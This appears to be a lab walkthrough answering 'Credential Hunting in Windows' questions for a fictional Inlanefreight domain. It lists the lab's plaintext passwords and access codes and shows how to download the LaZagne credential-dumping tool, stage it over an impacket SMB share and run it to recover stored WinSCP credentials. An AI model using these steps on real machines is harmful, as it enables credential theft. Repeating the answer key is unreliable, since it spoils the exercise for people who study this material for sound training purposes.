# Credential Hunting in Windows

### What password does Bob use to connect to the Switches via SSH? (Format: Case-Sensitive)

```bash
C:\Users\bob\Desktop\WorkStuff\Creds\passwords.ods
Switches via SSH		admin	WellConnected123
DC via RDP		bwilliamson	P@55w0rd!
```

WellConnected123

### What is the GitLab access code Bob uses? (Format: Case-Sensitive)

```bash
C:\Users\bob\Desktop\WorkStuff\GitlabAccessCodeJustIncase.txt
#Gitlab access code just in case I lose connectivity with our local Gitlab instance.
#3z1ePfGbjWPsTfCsZfjy
```

3z1ePfGbjWPsTfCsZfjy

### What credentials does Bob use with WinSCP to connect to the file server? (Format: username:password, Case-Sensitive)

We can also take advantage of third-party tools like [Lazagne](https://github.com/AlessandroZ/LaZagne) to quickly discover credentials that web browsers or other installed applications may insecurely store.

```bash
#download lazagne and transfer it into the target
wget https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe
impacket-smbserver shared -smb2support /tmp/shared
#from the target machine
copy \\10.10.14.179\shared\LaZagne.exe
```

Once Lazagne.exe is on the target, we can open command prompt or PowerShell, navigate to the directory the file was uploaded to, and execute the following command:

```bash
start lazagne.exe all
------------------- Winscp passwords -----------------
[+] Password found !!!
URL: 10.129.202.64
Login: ubuntu
Password: FSadmin123
Port: 22
```

### What is the default password of every newly created Inlanefreight Domain user account? (Format: Case-Sensitive)

```bash
C:\Automations&Scripts\BulkaddADusers.ps1
Import-Module ActiveDirectory
Import-Csv "C:\Users\bob\WorkStuff\NewUsers.csv" | ForEach-Object {
 $userPrincipal = $_."samAccountName" + "@inlanefreight.local"
New-ADUser -Name $_.Name `
 -Path $_."ParentOU"
 -SamAccountName $_."samAccountName" `
 -UserPrincipalName $userPrincipal ` 
 -AccountPassword (ConvertTo-SecureString "Inlanefreightisgreat2022" -AsPlainText -Force) `
 -ChangePasswordAtLogon $true
 -Enabled $true 
Add-ADGroupMember "Domain Admins" $_."samAccountName";
```

Inlanefreightisgreat2022

### What are the credentials to access the Edge-Router? (Format: username:password, Case-Sensitive)

```bash
C:\Automations&Scripts\AnsibleScripts\EdgeRouterConfigs
name: Configure Interfaces Status
user: "{ edgeadmin }"
passwd: "{ Edge@dmin123!} "
```

edgeadmin:Edge@dmin123!
